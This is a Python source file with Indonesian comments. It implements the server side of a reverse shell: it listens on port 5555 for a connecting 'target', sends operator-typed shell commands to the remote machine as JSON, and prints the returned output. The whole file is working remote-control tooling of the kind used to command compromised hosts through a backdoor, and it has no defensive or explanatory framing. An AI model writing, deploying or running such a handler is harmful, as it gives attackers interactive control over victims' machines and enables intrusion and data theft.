import socket
import json

# --- 1. Fungsi Bantuan untuk Jaringan (send dan receive) ---

# Fungsi untuk mengirim data dengan encoding JSON yang andal
def reliable_send(data):
    """Mengirim data (di-encode JSON) melalui koneksi socket."""
    jsondata = json.dumps(data)
    # Mengirim semua data. Perhatikan bahwa 'target' harus tersedia di scope
    target.sendall(jsondata.encode())

# Fungsi untuk menerima data dengan decoding JSON yang andal
def reliable_recv():
    """Menerima dan mendekode data JSON secara andal."""
    data = ""
    while True:
        try:
            # Menerima chunk data dan mendekode. rstrip() dihapus karena bisa merusak data JSON
            data = data + target.recv(1024).decode()
            # Mencoba mengurai data sebagai JSON (jika data utuh sudah diterima)
            return json.loads(data)
        except ValueError:
            # Jika belum semua data diterima, lanjut ke loop berikutnya
            continue
        except Exception as e:
            # Menangani error umum
            # print(f"Error saat menerima data: {e}")
            break # Keluar dari loop jika terjadi error fatal

# --- 2. Fungsi Komunikasi Server ---

def target_communicate():
    """Loop utama untuk interaksi dengan klien (target)."""
    # Mengubah logika agar server meminta input dan mengirimkannya ke klien
    while True:
        try:
            # 1. Server meminta input dari pengguna
            # Variabel 'ip' sudah tersedia dari scope global setelah sock.accept()
            command = input("* Shell~%s: " % str(ip[0])) # Menggunakan ip[0] karena ip adalah tuple
            
            # 2. Kirim perintah ke klien (target)
            reliable_send(command)
            
            # 3. Cek apakah perintahnya "quit" untuk mengakhiri sesi
            if command == "quit":
                break
            
            # 4. Terima hasil (output) dari klien
            result = reliable_recv()
            
            # 5. Tampilkan hasil
            print(result)

        except Exception as e:
            print(f"\n[!] Sesi komunikasi diakhiri. Error: {e}")
            break

# --- 3. Inisialisasi dan Koneksi Socket ---

# Inisialisasi variabel target dan ip di scope global (di luar fungsi)
target = None
ip = None

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Gunakan alamat 0.0.0.0 agar mendengarkan di semua interface jaringan
    sock.bind(("0.0.0.0", 5555)) 
    print("[+] Listening For Incoming Connections...")
    sock.listen(5)
    
    # Menerima koneksi
    target, ip = sock.accept()
    print("[+] Target Connected From: " + str(ip[0]))

    # Memulai komunikasi
    target_communicate()

except KeyboardInterrupt:
    print("\n[!] Server Dihentikan.")
except Exception as e:
    print(f"\n[!] Terjadi kesalahan fatal: {e}")
finally:
    # Pastikan socket ditutup
    if target:
        target.close()
    if 'sock' in locals():
        sock.close()
